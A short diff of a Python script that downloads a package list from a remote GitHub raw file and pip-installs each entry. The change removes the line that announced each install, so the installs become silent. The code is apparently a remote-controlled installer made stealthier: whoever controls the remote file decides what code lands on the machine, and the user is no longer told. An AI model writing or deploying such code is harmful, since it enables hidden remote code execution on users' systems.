@@ -9,7 +9,6 @@ user_profile = os.environ['USERPROFILE']
 def install_packages(package_string):
     packages = package_string.split()
     for package in packages:
-        print(f"Installing {package}...")
         subprocess.run([sys.executable, "-m", "pip", "install", package], check=True)
 r = requests.get("https://raw.githubusercontent.com/noel-create/skibidi/refs/heads/main/new_packages.txt")
 p1 = r.text
